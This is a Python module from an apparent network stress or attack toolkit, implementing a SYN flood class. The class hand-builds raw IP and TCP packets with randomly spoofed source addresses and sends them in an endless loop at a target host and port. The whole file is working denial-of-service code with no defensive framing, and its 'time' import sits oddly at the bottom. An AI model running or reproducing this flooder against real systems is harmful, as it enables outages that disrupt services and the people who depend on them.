import socket
import random
import struct

from .base import BaseAttacker

class SYNFlood(BaseAttacker):
    def __init__(self, args, config, stats, running, worker_id):
        super().__init__(args, config, stats, running, worker_id)
        self.syn_config = config.get('syn', {})

    def _checksum(self, msg):
        s = 0
        for i in range(0, len(msg), 2):
            w = (msg[i] << 8) + (msg[i + 1] if i + 1 < len(msg) else 0)
            s += w
        s = (s >> 16) + (s & 0xffff)
        s = ~s & 0xffff
        return s

    def _build_syn_packet(self, src_ip, dst_ip, src_port, dst_port):
        # IP Header
        ip_tot_len = 20 + 20
        ip_id = random.randint(0, 65535)
        ip_saddr = socket.inet_aton(src_ip)
        ip_daddr = socket.inet_aton(dst_ip)
        ip_header = struct.pack('!BBHHHBBH4s4s',
            (4 << 4) + 5, 0, ip_tot_len, ip_id, 0,
            255, socket.IPPROTO_TCP, 0, ip_saddr, ip_daddr)

        # TCP Header
        tcp_seq = random.randint(0, 4294967295)
        tcp_window = socket.htons(random.randint(8192, 65535))
        tcp_flags = (1 << 1)  # SYN
        tcp_header = struct.pack('!HHLLBBHHH',
            src_port, dst_port, tcp_seq, 0,
            (5 << 4), tcp_flags, tcp_window, 0, 0)

        # Checksum over pseudo header
        psh = struct.pack('!4s4sBBH',
            ip_saddr, ip_daddr, 0, socket.IPPROTO_TCP, len(tcp_header)) + tcp_header
        tcp_check = self._checksum(psh)

        tcp_header = struct.pack('!HHLLBBH',
            src_port, dst_port, tcp_seq, 0,
            (5 << 4), tcp_flags, tcp_window) + struct.pack('H', tcp_check) + struct.pack('!H', 0)

        return ip_header + tcp_header

    def attack(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except PermissionError:
            print(f"[!] Worker {self.worker_id}: Raw sockets require root privileges")
            return

        try:
            while self.running.value:
                try:
                    src_ip = self.random_ip()
                    src_port = random.randint(1024, 65535)
                    packet = self._build_syn_packet(src_ip, self.target,
                                                    src_port, self.port)
                    sock.sendto(packet, (self.target, self.port))
                    self._count(sent=1, size=len(packet))
                except Exception:
                    self._count(failed=1)
                    time.sleep(0.001)
                self._pace()
        finally:
            try:
                sock.close()
            except Exception:
                pass
            self.finalize()

# base.py imports time
import time